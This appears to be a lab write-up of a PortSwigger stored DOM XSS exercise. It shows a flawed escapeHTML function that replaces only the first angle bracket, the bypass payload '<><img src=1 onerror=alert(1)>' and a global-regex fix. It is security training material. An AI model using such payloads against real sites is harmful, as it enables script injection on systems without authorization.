# Stored DOM XSS

> **Vulnerability Type:** DOM XSS (Stored)  
> **Lab URL:** [Stored DOM XSS Lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)

---

## Objective  
Exploit the stored DOM XSS vulnerability to call the alert() function.

---

## Setup  
- **Tools Used:** Burp Suite  
- **Environment Details:** PortSwigger Lab  

---

## Methodology  

### 1. **Discovery**  
- **Initial Observations:**  
  Found the ability to comment on blog posts, with JavaScript containing a replace() function to encode angle brackets:
  ```javascript
  function escapeHTML(html) {
      return html.replace('<', '&lt;').replace('>', '&gt;');
  }

---

### 2. Testing Approach
Tested which inputs allowed angle brackets (`<>`). The inputs for comment, name, and website allowed angle brackets, but the email input did not. Crafted a payload to bypass the initial angle bracket encoding:
```XSS
<><img src=1 onerror=alert(1)>
```
---
### 3. Remediation
To remediate this issue, the `escapeHTML` function should be updated to use a global flag to ensure all occurrences of the angle brackets are replaced:
```javascript
function escapeHTML(html) {
    return html.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
```
---
### Exploitation
- **Payload Used:**
  ```XSS
  <><img src=1 onerror=alert(1)>
  ```
### Screenshot
- Screenshot below shows the javascript with the "replace()" function highlighted.

![Screenshot 2025-03-05 035250](https://github.com/user-attachments/assets/55e1047b-7f5d-486f-8331-f368bfac32c6)
